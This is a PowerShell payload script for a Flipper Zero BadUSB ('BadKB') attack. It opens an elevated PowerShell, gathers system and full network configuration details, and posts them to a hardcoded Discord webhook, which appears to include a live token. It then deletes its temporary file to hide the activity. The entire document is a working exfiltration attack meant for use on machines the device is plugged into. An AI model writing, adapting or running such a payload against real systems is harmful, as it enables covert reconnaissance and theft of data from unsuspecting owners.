# BadUSB script example for Flipper Zero - "BadKB"
# This script will open PowerShell as administrator, gather system information, save it to a file, and send it to a Discord WebHook

# Function to gather system information
function Get-SystemInformation {
    try {
        $sysInfo = Get-WmiObject -Class Win32_OperatingSystem | Select-Object CSName, Version, BuildNumber, TotalVisibleMemorySize
        return $sysInfo
    } catch {
        Write-Error "Failed to retrieve system information: $_"
        return $null
    }
}

# Function to gather network information
function Get-NetworkInformation {
    try {
        $ipConfig = ipconfig /all
        return $ipConfig
    } catch {
        Write-Error "Failed to retrieve network information: $_"
        return $null
    }
}

# Function to send data to Discord WebHook
function Send-ToDiscord {
    param (
        [string]$webhookUrl,
        [string]$content
    )
    try {
        Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType 'application/json' -Body (@{content=$content} | ConvertTo-Json)
    } catch {
        Write-Error "Failed to send data to Discord: $_"
    }
}

# Main script execution
Start-Sleep -Milliseconds 1000
# Delay to ensure the computer has time to recognize the device

Start-Process PowerShell -ArgumentList '-Command "Start-Process PowerShell -Verb RunAs"' -Wait
# Run PowerShell as Administrator and wait for the process to start

Start-Sleep -Milliseconds 2000
# Wait for the UAC prompt to appear and confirm

# Note: User might need to confirm the UAC prompt manually (depending on system language)

Start-Sleep -Milliseconds 1500

# Define the Discord WebHook URL
$webhookUrl = 'https://discord.com/api/webhooks/1225028544258641981/kmftS6B2qpwjcNBn3ovPTEoI8MVsRDikLkYZr1tUTuHNohr-A6ljyvd3MRRGwmI8ehOo'

# Gather system and network information
$sysInfo = Get-SystemInformation
$ipConfig = Get-NetworkInformation

# Set the file path to save system information
$filePath = "$env:TEMP\sysinfo.txt"

# Save the gathered information to a file with UTF8 encoding
if ($sysInfo -ne $null -and $ipConfig -ne $null) {
    "$sysInfo`n`n$ipConfig" | Out-File -FilePath $filePath -Encoding UTF8
    $content = Get-Content -Path $filePath -Raw
    # Send the gathered information to the Discord WebHook
    Send-ToDiscord -webhookUrl $webhookUrl -content $content
    # Remove the file after sending
    Remove-Item -Path $filePath
}

Exit
# Close PowerShell
